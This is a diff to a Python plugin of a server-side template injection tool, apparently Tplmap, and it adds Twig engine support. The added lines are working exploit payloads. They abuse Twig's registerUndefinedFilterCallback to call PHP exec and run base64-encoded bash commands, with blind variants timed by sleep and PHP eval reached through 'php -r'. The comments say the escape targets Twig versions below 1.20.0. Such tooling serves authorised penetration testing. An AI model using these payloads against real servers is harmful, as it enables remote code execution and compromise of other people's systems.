@@ -1,5 +1,6 @@
 from utils.loggers import log
 from plugins.languages import php
+from plugins.languages import bash
 from utils import rand
 import string
 
@@ -7,7 +8,12 @@ class Twig(php.Php):
     
     def init(self):
 
-        self.set_actions({
+        # The vulnerable versions <1.20.0 allows to map the getFilter() function
+        # to any PHP function, allowing the sandbox escape.
+        
+        # Functions with only 1 parameter can be used.
+
+        self.update_actions({
             'render' : {
                 'render': '{{%(code)s}}',
                 'header': '{{%(header)s}}',
@@ -20,7 +26,29 @@ class Twig(php.Php):
                 'test_render_expected': '%(res)s<br />' % { 
                     'res' : rand.randstrings[0]
                 }
-            }
+            },
+            # Hackish way to evaluate PHP code, since eval/assert can't be mapped
+            'evaluate' : {
+                'call': 'execute',
+                'evaluate': """php -r '$d="%(code_b64)s";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%%4,"=",STR_PAD_RIGHT)));'""",
+                'test_os' : 'echo PHP_OS;',
+                'test_os_expected': '^[\w-]+$'
+            },
+            'execute' : {
+                'call': 'render',
+                'execute': """_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("bash -c '{eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}'")""",
+                'test_cmd': bash.echo % { 's1': rand.randstrings[2] },
+                'test_cmd_expected': rand.randstrings[2] 
+            },
+            'execute_blind' : {
+                'call': 'inject',
+                'execute_blind': """{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("bash -c '{eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}&&{sleep,%(delay)s}'")}}"""
+            },
+            # Hackish way to evaluate PHP code, since eval/assert can't be mapped
+            'evaluate_blind' : {
+                'call': 'execute',
+                'evaluate_blind': """php -r '$d="%(code_b64)s";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%%4,"=",STR_PAD_RIGHT)) . ") && sleep(%(delay)i);");'"""
+            },
         })
         
         self.set_contexts([
